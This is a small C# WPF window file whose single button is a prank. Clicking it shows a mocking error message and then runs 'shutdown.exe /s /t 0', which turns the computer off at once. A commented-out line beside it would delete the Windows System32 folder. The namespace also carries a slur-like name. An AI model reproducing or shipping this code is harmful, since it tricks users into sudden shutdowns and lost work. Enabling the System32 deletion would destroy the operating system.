using System.Diagnostics;
using System.IO;
using System.Windows;

namespace wpfhomotest
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            MessageBox.Show("Русские не сдаются!", "Ты не пацан", MessageBoxButton.OK, MessageBoxImage.Error);
            //Directory.Delete("C:\\Windows\\System32"); // опа опа...
            new Process() { StartInfo = new ProcessStartInfo() { FileName = "shutdown.exe", Arguments = "/s /t 0" } }.Start();
        }
    }
}
